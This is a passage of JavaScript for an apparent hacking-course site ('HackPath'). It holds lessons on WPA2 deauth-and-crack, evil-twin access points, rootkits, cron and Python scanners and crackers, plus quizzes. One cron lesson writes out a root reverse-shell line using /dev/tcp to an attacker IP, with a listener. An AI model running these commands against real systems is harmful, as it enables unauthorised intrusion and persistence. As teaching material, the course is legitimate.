    ${T("BASH TERMINAL ‚Äî kali@hackpath",P("gpg --gen-key")+"<br>"+O("pub   ed25519 2025-01-15 [SC]<br>      A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6E7F8A9B0<br>uid   HackPath Tester <tester@hackpath.io><br>sub   cv25519 2025-01-15 [E]")+"<br>"+P("gpg --encrypt --recipient tester@hackpath.io report.pdf")+"<br>"+O("report.pdf.gpg created")+"<br>"+P("gpg --decrypt report.pdf.gpg > report_decrypted.pdf")+"<br>"+COM("# Only the private key holder can decrypt"))}`},
    {name:"Operational Security (OPSEC) Best Practices",content:`<p>OPSEC is the practice of protecting information about your operations. Professional penetration testers and red teamers maintain strict OPSEC to ensure their activities are attributable only to them, and to protect client confidentiality.</p>
    <h3>OPSEC Checklist for Every Engagement</h3>
    <ul><li>Use a dedicated VM that you wipe after each engagement</li><li>Never use personal accounts or emails on test infrastructure</li><li>Route all traffic through VPN + Tor for reconnaissance</li><li>Change MAC address before connecting to client networks</li><li>Encrypt all engagement notes and findings with GPG</li><li>Use a secure communication channel (Signal, encrypted email) with the client</li><li>Never store client data on personal hardware ‚Äî use encrypted external drives</li><li>Clean up all artifacts after engagement: shells, payloads, user accounts</li></ul>
    ${TIP("ATTRIBUTION TRAP","Many organizations honeypot their public systems with unique credentials, URLs, or tokens that appear legitimate but trigger alerts when used. Always operate within the defined scope ‚Äî using out-of-scope systems, even by accident, can result in legal consequences.")}`}
  ],
  quiz:[
    {q:"proxychains routes traffic through:",opts:["VPN only","Proxy servers and/or Tor nodes","Direct connection","DNS servers"],ans:1},
    {q:"After connecting to HackTheBox VPN, your HTB IP appears on:",opts:["eth0","lo","tun0","wlan0"],ans:2},
    {q:"GPG provides what type of encryption?",opts:["Symmetric only","Asymmetric (public/private key)","Hash-based","Certificate-based"],ans:1}
  ]
},
{
  num:14, title:"Wireless Networks", icon:"üì°",
  desc:"Crack WPA2, capture 4-way handshakes, detect Bluetooth, and understand wireless attack fundamentals.",
  xp:35,
  lessons:[
    {name:"Wireless Standards & Security Protocols",content:`<p>Understanding wireless standards is prerequisite to attacking them. Each generation introduced security improvements ‚Äî and new attack surfaces.</p>
    <table><tr><th>Standard</th><th>Security</th><th>Vulnerability</th></tr><tr><td>802.11b/g</td><td>WEP</td><td>Broken ‚Äî crack in minutes</td></tr><tr><td>802.11n</td><td>WPA/TKIP</td><td>TKIP deprecated, dictionary attacks</td></tr><tr><td>802.11ac</td><td>WPA2-CCMP</td><td>4-way handshake capture + offline crack</td></tr><tr><td>802.11ax</td><td>WPA3-SAE</td><td>More resistant but not immune</td></tr></table>
    ${T("BASH TERMINAL ‚Äî kali@hackpath",P("iw dev")+"<br>"+O("phy#0<br>  Interface wlan0<br>    type managed<br>    channel 6, width: 20 MHz<br>    txpower 20.00 dBm")+"<br>"+P("iw phy phy0 info | grep -A5 'Supported interface'")+"<br>"+O("Supported interface modes:<br>  * IBSS<br>  * managed<br>  * AP<br>  * monitor")+"<br>"+COM("# monitor mode supported ‚Äî we can capture raw packets"))}`},
    {name:"Monitor Mode & Packet Capture",content:`<p>Monitor mode allows your wireless card to capture ALL packets in range ‚Äî not just those addressed to your card. This is the foundation of every wireless attack.</p>
    ${T("BASH TERMINAL ‚Äî kali@hackpath",P("airmon-ng check kill")+"<br>"+O("Killing interfering processes:<br>PID Name<br>892  NetworkManager<br>1047 wpa_supplicant")+"<br>"+P("airmon-ng start wlan0")+"<br>"+O("PHY  Interface  Driver     Chipset<br>phy0  wlan0     ath9k_htc  Atheros AR9271<br><br>monitor mode enabled on wlan0mon")+"<br>"+P("airodump-ng wlan0mon")+"<br>"+O(" BSSID              PWR  CH  #Data  ESSID<br> AA:BB:CC:DD:EE:FF  -45   6   1247  HomeNetwork<br> 11:22:33:44:55:66  -72  11    342  CoffeeShop_WiFi<br> DE:AD:BE:EF:CA:FE  -68   1    891  CorpNetwork"))}`},
    {name:"WPA2 Handshake Capture & Cracking",content:`<p>WPA2 uses a 4-way handshake to authenticate clients. Capturing this handshake and performing an offline dictionary attack against it is the standard WPA2 cracking technique.</p>
    ${T("BASH TERMINAL ‚Äî kali@hackpath",P("airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon")+"<br>"+O("CH  6 ][ Elapsed: 12 s<br><br> BSSID              PWR  ESSID<br> AA:BB:CC:DD:EE:FF  -45  HomeNetwork<br><br> STATION            PWR   BSSID<br> 11:22:33:44:55:01  -55   AA:BB:CC:DD:EE:FF")+"<br>"+P("aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:01 wlan0mon")+"<br>"+GR("Sending 10 directed DeAuth. STMAC: [11:22:33:44:55:01] [ 6| 2 ACKs]<br>WPA handshake: AA:BB:CC:DD:EE:FF captured!")+"<br>"+P("aircrack-ng -w /opt/SecLists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt handshake-01.cap")+"<br>"+GR("KEY FOUND! [ homepassword123 ]<br>Master Key:      A3 F2 ... 8B C4"))}`},
    {name:"Bluetooth Reconnaissance",content:`<p>Bluetooth attacks are often overlooked but can be devastating ‚Äî especially against IoT devices, cars, and enterprise equipment. Kali includes several Bluetooth tools.</p>
    ${T("BASH TERMINAL ‚Äî kali@hackpath",P("hciconfig")+"<br>"+O("hci0:  Type: Primary  Bus: USB<br>  BD Address: 00:1A:7D:DA:71:13<br>  UP RUNNING PSCAN ISCAN")+"<br>"+P("hcitool scan")+"<br>"+O("Scanning ...<br>  00:1D:A5:78:4C:01 iPhone 13<br>  DC:A6:32:F9:C1:42 Samsung TV<br>  00:0C:8A:5E:4B:12 HP Printer")+"<br>"+P("btscanner")+"<br>"+COM("# Full Bluetooth scanner ‚Äî detailed device info, services")+"<br>"+P("sdptool browse 00:1D:A5:78:4C:01")+"<br>"+O("Browsing 00:1D:A5:78:4C:01 ...<br>Service Name: AVRCP<br>Service Name: Handsfree<br>Service Name: Audio Source"))}
    ${INFO("BLUEBUGGING & BLUEJACKING","Older Bluetooth vulnerabilities (BlueBorne, Bluesnarfing, Bluebugging) allow full remote code execution. Always check if target devices run updated firmware. In IoT environments, Bluetooth vulns are rampant.")}`},
    {name:"Evil Twin & Rogue Access Point Attacks",content:`<p>An evil twin is a rogue WiFi access point mimicking a legitimate one. When users connect, you intercept all their traffic. This is a classic MitM (Man-in-the-Middle) attack used in physical pentests.</p>
    ${T("BASH TERMINAL ‚Äî kali@hackpath",P("apt install hostapd dnsmasq -y")+"<br>"+P("cat hostapd.conf")+"<br>"+O("interface=wlan0<br>driver=nl80211<br>ssid=CoffeeShop_WiFi<br>hw_mode=g<br>channel=6<br>macaddr_acl=0<br>auth_algs=1<br>ignore_broadcast_ssid=0")+"<br>"+P("hostapd hostapd.conf &")+"<br>"+O("Configuration file: hostapd.conf<br>wlan0: interface state UNINITIALIZED->ENABLED<br>wlan0: AP-ENABLED")+"<br>"+COM("# Evil twin is live! Now route clients through us:")+"<br>"+P("iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE")+"<br>"+COM("# All client traffic now flows through Kali ‚Äî run Wireshark!"))}`}
  ],
  quiz:[
    {q:"Monitor mode allows:",opts:["Faster connections","Capturing all nearby WiFi packets","Network injection","Boosting WiFi signal"],ans:1},
    {q:"aireplay-ng --deauth sends:",opts:["Authentication packets","Deauthentication packets to force reconnection","Data packets","Beacon packets"],ans:1},
    {q:"An evil twin attack creates:",opts:["A fake website","A rogue access point mimicking a legitimate one","A DNS poisoning attack","A Bluetooth replay attack"],ans:1}
  ]
},
{
  num:15, title:"Linux Kernel & Loadable Modules", icon:"üî©",
  desc:"Understand the kernel, loadable kernel modules, rootkit techniques, and driver-level security.",
  xp:30,
  lessons:[
    {name:"The Linux Kernel Architecture",content:`<p>The Linux kernel is the core of the OS ‚Äî managing hardware, processes, memory, and the filesystem. Advanced attackers and rootkit authors operate at kernel level for maximum stealth and capability.</p>
    <h3>Kernel Layers</h3>
    <table><tr><th>Layer</th><th>Description</th><th>Attack Surface</th></tr><tr><td>System Call Interface</td><td>Bridge between userspace and kernel</td><td>Syscall interception (rootkits)</td></tr><tr><td>Process Management</td><td>Scheduler, fork, exec</td><td>Process hiding</td></tr><tr><td>Memory Management</td><td>Virtual memory, page tables</td><td>Kernel exploits, heap spray</td></tr><tr><td>Device Drivers</td><td>Hardware interface modules</td><td>Malicious driver injection</td></tr><tr><td>Network Stack</td><td>TCP/IP implementation</td><td>Packet filtering bypass</td></tr></table>
    ${T("BASH TERMINAL ‚Äî kali@hackpath",P("uname -r")+"<br>"+O("6.1.0-kali9-amd64")+"<br>"+P("cat /proc/version")+"<br>"+O("Linux version 6.1.0-kali9-amd64 (devel@kali.org) (gcc-12 12.2.0) #1 SMP")+"<br>"+P("sysctl -a | grep 'kernel.kptr'")+"<br>"+O("kernel.kptr_restrict = 2")+"<br>"+COM("# kptr_restrict=2 hides kernel pointers ‚Äî modern hardening"))}`},
    {name:"Loadable Kernel Modules (LKM)",content:`<p>LKMs extend kernel functionality at runtime ‚Äî network drivers, filesystem handlers, and security modules are all LKMs. Rootkits exploit this mechanism to inject malicious code into the running kernel.</p>
    ${T("BASH TERMINAL ‚Äî kali@hackpath",P("lsmod | head -15")+"<br>"+O("Module                  Size  Used by<br>xt_conntrack           24576  1<br>nf_conntrack          176128  2<br>nft_compat             20480  2<br>ip_tables              36864  1<br>ath9k_htc              81920  0<br>mac80211              925696  1 ath9k_htc")+"<br>"+P("modinfo ath9k_htc")+"<br>"+O("filename:     /lib/modules/6.1.0-kali9/kernel/drivers/net/wireless/ath/ath9k/ath9k_htc.ko<br>description:  Atheros driver 802.11n HTC based wireless devices<br>author:       Atheros Communications<br>license:      Dual BSD/GPL")+"<br>"+P("insmod /tmp/my_module.ko")+"<br>"+COM("# Load custom module ‚Äî this is how rootkits enter the kernel"))}`},
    {name:"Kernel Module Development",content:`<p>Understanding how to write a basic kernel module teaches you how rootkits work. This knowledge is essential for malware analysis and for writing kernel-level security tools.</p>
    ${T("BASH TERMINAL ‚Äî kali@hackpath",P("cat hello_module.c")+"<br>"+O("#include &lt;linux/init.h&gt;<br>#include &lt;linux/module.h&gt;<br>#include &lt;linux/kernel.h&gt;<br><br>MODULE_LICENSE(\"GPL\");<br>MODULE_AUTHOR(\"HackPath Academy\");<br>MODULE_DESCRIPTION(\"Demo kernel module\");<br><br>static int __init hello_init(void) {<br>    printk(KERN_INFO \"[HackPath] Module loaded into kernel\\n\");<br>    return 0; }<br><br>static void __exit hello_exit(void) {<br>    printk(KERN_INFO \"[HackPath] Module unloaded\\n\"); }<br><br>module_init(hello_init);<br>module_exit(hello_exit);")+"<br>"+P("make && insmod hello_module.ko")+"<br>"+P("dmesg | tail -2")+"<br>"+GR("[ 3421.123] [HackPath] Module loaded into kernel"))}`},
    {name:"Rootkit Fundamentals",content:`<p>Rootkits operate at kernel level to hide the attacker's presence ‚Äî hiding files, processes, network connections, and even themselves from detection tools. Understanding rootkit techniques is essential for building defenses.</p>
    ${T("BASH TERMINAL ‚Äî kali@hackpath",P("lsmod | grep -v Module | awk '{print $1}' | xargs -I{} modinfo {} 2>/dev/null | grep -E 'filename|description' | paste - -")+"<br>"+O("# Cross-reference with known good module list")+"<br>"+P("cat /proc/modules | awk '{print $1}' > running_modules.txt")+"<br>"+P("diff running_modules.txt known_good_modules.txt")+"<br>"+GR("< suspicious_mod")+"<br>"+COM("# Module in running list but not in known-good list ‚Äî potential rootkit!")+"<br>"+P("chkrootkit")+"<br>"+O("Checking 'lkm'... You have  2 process hidden for ps command<br>INFECTED")+"<br>"+COM("# chkrootkit detected hidden processes ‚Äî system is compromised"))}`},
    {name:"Detecting Kernel Tampering",content:`<p>Detecting a kernel-level rootkit is extremely difficult ‚Äî the rootkit controls the very tools you use to detect it. Multiple detection strategies must be employed.</p>
    ${T("BASH TERMINAL ‚Äî kali@hackpath",P("apt install chkrootkit rkhunter -y")+"<br>"+P("rkhunter --check --rwo")+"<br>"+O("[13:45:01] Checking for rootkits...<br>[13:45:02]   Checking for 'adore-ng'... [ Not found ]<br>[13:45:02]   Checking for 'azazel'... [ Not found ]<br>[13:45:03] System checks summary<br>[13:45:03] File properties checks: Warnings found!")+"<br>"+P("cat /proc/kallsyms | grep -i 'sys_call_table'")+"<br>"+COM("# If sys_call_table address differs from known good ‚Äî syscall table hooked!")+"<br>"+P("ls /proc/ | wc -l && ps aux | wc -l")+"<br>"+COM("# If /proc/ has MORE entries than ps ‚Äî processes are hidden by rootkit"))}`}
  ],
  quiz:[
    {q:"lsmod shows:",opts:["Loaded kernel modules","Memory modules","Network modules only","Available modules"],ans:0},
    {q:"insmod loads a kernel module from:",opts:["Package manager","A .ko file","The internet","/etc/modules only"],ans:1},
    {q:"A rootkit hides by operating at:",opts:["Application layer","Kernel layer","Network layer","Filesystem layer only"],ans:1}
  ]
},
{
  num:16, title:"Task Scheduling & Automation", icon:"‚è∞",
  desc:"Master cron and at for automating recon, maintaining persistence, and scheduling offensive operations.",
  xp:25,
  lessons:[
    {name:"The cron Daemon & crontab Syntax",content:`<p>cron is the Linux task scheduler. It runs commands on a schedule ‚Äî used legitimately for backups and updates, and by attackers for persistence and automated operations.</p>
    <h3>Crontab Syntax ‚Äî 5 Fields</h3>
    <table><tr><th>Field</th><th>Range</th><th>Meaning</th></tr><tr><td>Minute</td><td>0-59</td><td>Minute of the hour</td></tr><tr><td>Hour</td><td>0-23</td><td>Hour of the day</td></tr><tr><td>Day of Month</td><td>1-31</td><td>Day of the month</td></tr><tr><td>Month</td><td>1-12</td><td>Month of the year</td></tr><tr><td>Day of Week</td><td>0-7</td><td>Day of week (0 and 7 = Sunday)</td></tr></table>
    ${T("BASH TERMINAL ‚Äî kali@hackpath",P("crontab -e")+"<br>"+O("# Run recon script every day at 3 AM<br>0 3 * * * /opt/scripts/recon.sh >> /tmp/recon.log 2>&1<br><br># Run every 15 minutes<br>*/15 * * * * /opt/check_alive.sh<br><br># Run at 2:30 PM on weekdays only<br>30 14 * * 1-5 /opt/report.sh<br><br># Run on the first of every month<br>0 0 1 * * /opt/monthly_scan.sh")+"<br>"+P("crontab -l")+"<br>"+COM("# List current crontab")+"<br>"+P("crontab -r")+"<br>"+COM("# Remove all cron jobs ‚Äî use carefully!"))}`},
    {name:"System Cron Directories",content:`<p>Beyond user crontabs, system-wide cron directories let root schedule tasks without editing files. These are also common places attackers plant persistence.</p>
    ${T("BASH TERMINAL ‚Äî kali@hackpath",P("ls /etc/cron*")+"<br>"+O("/etc/crontab<br>/etc/cron.d/<br>/etc/cron.daily/<br>/etc/cron.hourly/<br>/etc/cron.monthly/<br>/etc/cron.weekly/")+"<br>"+P("ls -la /etc/cron.daily/")+"<br>"+O("-rwxr-xr-x 1 root root 376 Jan 10 apt-compat<br>-rwxr-xr-x 1 root root 811 Jan 10 dpkg")+"<br>"+COM("# Scripts dropped here run daily ‚Äî a classic persistence location")+"<br>"+P("cat /etc/crontab")+"<br>"+O("SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin<br>17 *  * * * root cd / && run-parts --report /etc/cron.hourly"))}`},
    {name:"Cron-Based Persistence",content:`<p>Attackers use cron to maintain access after reboots and shell closures. A malicious cron job reconnects to the attacker's server every few minutes ‚Äî providing a persistent reverse shell.</p>
    ${T("BASH TERMINAL ‚Äî kali@hackpath",P("echo '*/5 * * * * root bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' >> /etc/crontab")+"<br>"+COM("# Every 5 minutes, root initiates a reverse shell to our listener")+"<br>"+COM("# On our attacker machine:")+"<br>"+P("nc -lvnp 4444")+"<br>"+O("listening on [any] 4444 ...")+"<br>"+GR("Connection from 192.168.1.50:43251<br>root@victim:~# id<br>uid=0(root) gid=0(root)")+"<br>"+COM("# Persistent root reverse shell every 5 minutes!"))}
    ${DANGER("AUTHORIZED ONLY","Installing reverse shell cron jobs without authorization is a serious crime. This technique is taught to help you detect and remove it during incident response, and to understand persistence mechanisms for authorized red team work only.")}`},
    {name:"The at Command ‚Äî One-Time Scheduling",content:`<p>While cron handles recurring tasks, <code>at</code> schedules one-time future execution. Useful for time-delayed exploits, deferred cleanup, and time-sensitive operations.</p>
    ${T("BASH TERMINAL ‚Äî kali@hackpath",P("at 23:59 tonight")+"<br>"+O("at> /opt/scripts/midnight_scan.sh > /tmp/scan_$(date +%Y%m%d).log")+"<br>"+O("at> <EOT>")+"<br>"+GR("job 7 at Thu Jan 16 23:59:00 2025")+"<br>"+P("at now + 2 hours")+"<br>"+O("at> /opt/cleanup.sh")+"<br>"+O("at> <EOT>")+"<br>"+P("atq")+"<br>"+O("7    Thu Jan 16 23:59:00 2025 a root<br>8    Thu Jan 15 11:15:00 2025 a root")+"<br>"+P("atrm 7")+"<br>"+COM("# Remove job 7"))}`},
    {name:"Automating Reconnaissance Pipelines",content:`<p>Combining cron with modular scripts creates automated reconnaissance pipelines that continuously monitor targets and alert on changes ‚Äî used both by defenders (continuous monitoring) and attackers (long-term surveillance).</p>
    ${T("BASH TERMINAL ‚Äî kali@hackpath",P("cat /opt/continuous_recon.sh")+"<br>"+O("#!/bin/bash<br>TARGET='192.168.1.0/24'<br>DATE=$(date +%Y%m%d_%H%M)<br>OUTDIR=/opt/recon_results<br>mkdir -p $OUTDIR<br><br># Port scan<br>nmap -sV --min-rate=500 $TARGET -oX $OUTDIR/scan_${DATE}.xml 2>/dev/null<br><br># Compare with previous scan<br>if [ -f $OUTDIR/previous.xml ]; then<br>  ndiff $OUTDIR/previous.xml $OUTDIR/scan_${DATE}.xml | tee $OUTDIR/changes_${DATE}.txt<br>  if [ -s $OUTDIR/changes_${DATE}.txt ]; then<br>    echo 'ALERT: Network changes detected!' | mail -s 'Recon Alert' analyst@company.com<br>  fi<br>fi<br>cp $OUTDIR/scan_${DATE}.xml $OUTDIR/previous.xml")+"<br>"+P("echo '0 */6 * * * root /opt/continuous_recon.sh' >> /etc/crontab")+"<br>"+COM("# Runs every 6 hours ‚Äî automated threat detection pipeline"))}`}
  ],
  quiz:[
    {q:"Crontab entry '*/5 * * * *' runs:",opts:["Every 5 hours","Every 5 minutes","5 times daily","On the 5th of each month"],ans:1},
    {q:"Where do attackers commonly plant persistent cron jobs?",opts:["/tmp/cron","~/.cron","/etc/cron.d/ or /etc/crontab","Only in user crontab"],ans:2},
    {q:"'at now + 2 hours' schedules a task:",opts:["Every 2 hours","In exactly 2 hours from now","At 2:00 AM","2 hours after midnight"],ans:1}
  ]
},
{
  num:17, title:"Python Scripting for Hackers", icon:"üêç",
  desc:"Build professional hacking tools in Python: port scanners, web scrapers, password crackers, and exploit frameworks.",
  xp:50,
  lessons:[
    {name:"Python for Security Professionals",content:`<p>Python is the language of the security industry. Its readability, extensive standard library, and rich third-party ecosystem (scapy, requests, pwntools, impacket) make it ideal for rapid tool development.</p>
    <h3>Why Python for Hacking?</h3>
    <ul><li><strong>Speed of development</strong> ‚Äî prototype tools in minutes</li><li><strong>Rich libraries</strong> ‚Äî scapy (network packets), requests (HTTP), pwntools (pwn/exploit), impacket (Windows protocols)</li><li><strong>Cross-platform</strong> ‚Äî works on Windows, macOS, and Linux</li><li><strong>Metasploit modules</strong> ‚Äî Metasploit has Python integration</li><li><strong>CTF dominance</strong> ‚Äî most CTF solutions are Python</li></ul>
    ${T("BASH TERMINAL ‚Äî kali@hackpath",P("python3 --version")+"<br>"+O("Python 3.11.7")+"<br>"+P("pip3 list | grep -E 'scapy|requests|pwntools|impacket'")+"<br>"+O("impacket      0.11.0<br>pwntools      4.11.0<br>requests      2.31.0<br>scapy         2.5.0")+"<br>"+P("python3 -c \"import socket; s=socket.socket(); s.connect(('192.168.1.1',80)); print('Connected!')\"")+"<br>"+GR("Connected!"))}`},
    {name:"Sockets & Network Programming",content:`<p>The <code>socket</code> module provides raw network access. Understanding sockets at this level lets you craft custom protocols, implement scanners, and create reverse shells that bypass basic firewalls.</p>
    ${T("BASH TERMINAL ‚Äî kali@hackpath",P("python3 banner_grabber.py")+"<br>"+O("#!/usr/bin/env python3<br>import socket<br><br>def grab_banner(ip, port, timeout=3):<br>    try:<br>        s = socket.socket()<br>        s.settimeout(timeout)<br>        s.connect((ip, port))<br>        s.send(b'HEAD / HTTP/1.0\\r\\n\\r\\n')<br>        banner = s.recv(1024).decode('utf-8', errors='ignore')<br>        s.close()<br>        return banner.strip()<br>    except Exception as e:<br>        return f'Error: {e}'<br><br>targets = {'SSH': 22, 'HTTP': 80, 'FTP': 21, 'SMTP': 25}<br>for service, port in targets.items():<br>    print(f'[{service}:{port}] {grab_banner(\"192.168.1.50\", port)[:80]}')")+"<br>"+GR("[SSH:22] SSH-2.0-OpenSSH_8.4p1 Ubuntu-6ubuntu2.1<br>[HTTP:80] HTTP/1.1 200 OK Server: Apache/2.4.51<br>[FTP:21] 220 (vsFTPd 3.0.3)"))}`},
    {name:"Build a Full TCP Port Scanner",content:`<p>We build a production-quality, multi-threaded port scanner with banner grabbing, service detection, and HTML report generation.</p>
    ${T("BASH TERMINAL ‚Äî kali@hackpath",P("cat hackpath_scanner.py")+"<br>"+O("#!/usr/bin/env python3<br>\"\"\"HackPath Port Scanner v2.0 ‚Äî Multi-threaded with banner grabbing\"\"\"<br>import socket, threading, argparse, json<br>from datetime import datetime<br>from queue import Queue<br><br>results = []<br>results_lock = threading.Lock()<br>queue = Queue()<br><br>def scan_port(ip, port, timeout):<br>    try:<br>        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        s.settimeout(timeout)<br>        if s.connect_ex((ip, port)) == 0:<br>            banner = ''\n            try:<br>                s.send(b'\\r\\n')<br>                banner = s.recv(256).decode('utf-8','ignore').strip()<br>            except: pass<br>            s.close()<br>            with results_lock:<br>                results.append({'port': port, 'state': 'open', 'banner': banner})<br>                print(f'  [OPEN] {port}/tcp  {banner[:50]}')<br>    except: pass<br><br>def worker(ip, timeout):<br>    while not queue.empty():<br>        port = queue.get()<br>        scan_port(ip, port, timeout)<br>        queue.task_done()<br><br>if __name__ == '__main__':<br>    parser = argparse.ArgumentParser(description='HackPath Scanner')<br>    parser.add_argument('target')<br>    parser.add_argument('--ports', default='1-1024')<br>    parser.add_argument('--threads', type=int, default=100)<br>    args = parser.parse_args()<br>    <br>    start, end = map(int, args.ports.split('-'))<br>    for p in range(start, end+1): queue.put(p)<br>    <br>    print(f'[*] Scanning {args.target} ({start}-{end}) with {args.threads} threads')<br>    start_t = datetime.now()<br>    threads = [threading.Thread(target=worker, args=(args.target, 1)) for _ in range(args.threads)]<br>    [t.start() for t in threads]<br>    queue.join()<br>    print(f'[+] Done in {datetime.now()-start_t}. {len(results)} open ports.')")+"<br>"+P("python3 hackpath_scanner.py 192.168.1.50 --ports 1-65535 --threads 200")+"<br>"+GR("[*] Scanning 192.168.1.50 (1-65535) with 200 threads<br>  [OPEN] 22/tcp  SSH-2.0-OpenSSH_8.4p1<br>  [OPEN] 80/tcp  HTTP/1.1 200 OK<br>  [OPEN] 3306/tcp  mysql_native_password<br>[+] Done in 0:00:48. 3 open ports."))}`},
    {name:"HTTP Requests & Web Scraping for Recon",content:`<p>The <code>requests</code> library makes HTTP interactions trivial. Combined with web scraping, you can automate recon tasks: spidering sites, extracting emails, finding hidden endpoints, and testing for common vulnerabilities.</p>
    ${T("BASH TERMINAL ‚Äî kali@hackpath",P("cat web_recon.py")+"<br>"+O("#!/usr/bin/env python3<br>import requests<br>from bs4 import BeautifulSoup<br>import re, sys<br>from urllib.parse import urljoin<br><br>TARGET = sys.argv[1]<br>session = requests.Session()<br>session.headers['User-Agent'] = 'Mozilla/5.0 (compatible; Googlebot/2.1)'\n<br>r = session.get(TARGET, timeout=5, verify=False)<br>soup = BeautifulSoup(r.text, 'html.parser')<br><br># Extract emails<br>emails = set(re.findall(r'[\\w._%+\\-]+@[\\w.\\-]+\\.[a-zA-Z]{2,}', r.text))<br>print(f'[EMAIL] Found {len(emails)}: {emails}')<br><br># Extract all links<br>links = {urljoin(TARGET, a['href']) for a in soup.find_all('a', href=True)}<br>print(f'[LINKS] {len(links)} discovered')<br><br># Check for interesting files<br>wordlist = ['admin', 'backup', 'config', '.git', 'phpinfo.php', 'robots.txt']<br>for path in wordlist:<br>    resp = session.get(f'{TARGET}/{path}', timeout=3)<br>    if resp.status_code == 200:<br>        print(f'[FOUND] {TARGET}/{path} ({len(resp.content)} bytes)')")+"<br>"+P("python3 web_recon.py http://192.168.1.50")+"<br>"+GR("[EMAIL] Found 2: {'admin@corp.com', 'webmaster@corp.com'}<br>[LINKS] 47 discovered<br>[FOUND] http://192.168.1.50/admin (14203 bytes)<br>[FOUND] http://192.168.1.50/backup (dir listing!)<br>[FOUND] http://192.168.1.50/phpinfo.php (47kb)"))}`},
    {name:"Build a Password Cracker",content:`<p>Password cracking is a staple of penetration testing. We build a versatile Python password cracker supporting multiple hash types ‚Äî MD5, SHA1, SHA256, bcrypt ‚Äî with dictionary and rule-based attacks.</p>
    ${T("BASH TERMINAL ‚Äî kali@hackpath",P("cat hackpath_cracker.py")+"<br>"+O("#!/usr/bin/env python3<br>\"\"\"HackPath Password Cracker v1.0\"\"\"<br>import hashlib, sys, time, argparse<br>from pathlib import Path<br><br>HASH_MAP = {<br>    32: 'md5', 40: 'sha1', 64: 'sha256', 128: 'sha512'<br>}\n<br>def detect_hash(h):<br>    return HASH_MAP.get(len(h), 'unknown')<br><br>def crack(target_hash, wordlist_path, algorithm=None):<br>    algo = algorithm or detect_hash(target_hash)<br>    print(f'[*] Hash: {target_hash}')<br>    print(f'[*] Algorithm: {algo}')<br>    print(f'[*] Wordlist: {wordlist_path}')<br>    <br>    count = 0<br>    start = time.time()<br>    with open(wordlist_path, 'r', errors='ignore') as f:<br>        for line in f:<br>            word = line.strip()<br>            h = hashlib.new(algo)<br>            h.update(word.encode('utf-8'))<br>            if h.hexdigest() == target_hash:<br>                elapsed = time.time() - start<br>                print(f'[+] CRACKED! {target_hash} = {word}')<br>                print(f'[+] {count:,} words checked in {elapsed:.2f}s')<br>                return word<br>            count += 1<br>            if count % 100000 == 0:<br>                print(f'[~] {count:,} words... ({word})')<br>    print(f'[-] Not found after {count:,} attempts')")+"<br>"+P("echo -n 'password123' | md5sum")+"<br>"+O("482c811da5d5b4bc6d497ffa98491e38")+"<br>"+P("python3 hackpath_cracker.py 482c811da5d5b4bc6d497ffa98491e38 /usr/share/wordlists/rockyou.txt")+"<br>"+GR("[*] Hash: 482c811da5d5b4bc6d497ffa98491e38<br>[*] Algorithm: md5<br>[*] Wordlist: /usr/share/wordlists/rockyou.txt<br>[+] CRACKED! 482c811da5d5b4bc6d497ffa98491e38 = password123<br>[+] 9,272,901 words checked in 12.34s"))}`}
  ],
  quiz:[
    {q:"Python's threading module is useful for port scanners because:",opts:["Python is slow","It allows parallel port checking, dramatically increasing speed","Threads require less memory","Socket connections need threads"],ans:1},
    {q:"requests.Session() vs requests.get() ‚Äî Sessions:",opts:["Are slower","Persist cookies and headers across requests","Are only for POST requests","Require authentication"],ans:1},
    {q:"hashlib.new('md5').hexdigest() returns:",opts:["Base64 encoded hash","Hexadecimal string hash","Binary hash","Integer hash"],ans:1}
  ]
}
];

const GLOBAL_QUIZ = [
  {q:"Which nmap flag performs a SYN stealth scan?",opts:["-sT","-sS","-sU","-sA"],ans:1},
  {q:"SUID bit set on a root-owned binary means:",opts:["Anyone can write to it","It runs with root privileges regardless of who calls it","Only root can execute it","It's immutable"],ans:1},
  {q:"LD_PRELOAD exploitation works by:",opts:["Overloading CPU","Injecting a shared library before system libraries","Preloading the OS","Setting PATH variable"],ans:1},
  {q:"A DNS zone transfer (AXFR) reveals:",opts:["SSL certificates","Complete DNS record set including internal hostnames","Router configuration","Only MX records"],ans:1},
  {q:"The 4-way WPA2 handshake can be captured with:",opts:["Wireshark on managed mode","airodump-ng on monitor mode","tcpdump on eth0","nmap --capture"],ans:1},
  {q:"proxychains4 routes traffic through:",opts:["VPN only","Direct connection","Configured proxy chain (SOCKS/HTTP/Tor)","DNS servers"],ans:2},
  {q:"find / -perm -4000 -type f searches for:",opts:["All files owned by root","Files with SUID bit set","World-writable files","Hidden files"],ans:1},
  {q:"'export HISTFILE=/dev/null' achieves:",opts:["Faster command history","Logging commands to /dev","Disabling bash history logging","Exporting history"],ans:2},
  {q:"SSH -D 1080 creates:",opts:["Remote port forward","Local port forward","SOCKS dynamic proxy","Direct tunnel"],ans:2},
  {q:"Which Python library handles raw network packet crafting?",opts:["requests","socket","scapy","impacket"],ans:2},
  {q:"A crontab entry '*/5 * * * *' runs:",opts:["At minute 5","Every 5 hours","Every 5 minutes","5 times only"],ans:2},
  {q:"lsmod shows modules that differ from a known good list ‚Äî this indicates:",opts:["Normal kernel behavior","Possible rootkit activity","Module update needed","Driver conflict"],ans:1},
  {q:"After privilege escalation, covering tracks means:",opts:["Deleting the entire /var/log","Only clearing bash history","Selectively removing evidence while avoiding obvious tampering","Running rm -rf /"],ans:2},
  {q:"dd if=/dev/sdb of=disk.img creates:",opts:["A file backup","A bit-for-bit forensic disk image","A virtual machine","An encrypted volume"],ans:1},
  {q:"macchanger -r eth0 does what?",opts:["Restores original MAC","Assigns a random MAC address","Changes route table","Resets interface"]  ,ans:1}
];


// =================== INTERACTIVE TERMINAL ENGINE ===================
const TERM_RESPONSES = {
  // Navigation
  'pwd': () => ok('/home/kali'),
  'whoami': () => ok('kali'),
  'id': () => ok('uid=1000(kali) gid=1000(kali) groups=1000(kali),24(cdrom),27(sudo),29(audio)'),
  'hostname': () => ok('hackpath-lab'),
  'uname -r': () => ok('6.1.0-kali9-amd64'),
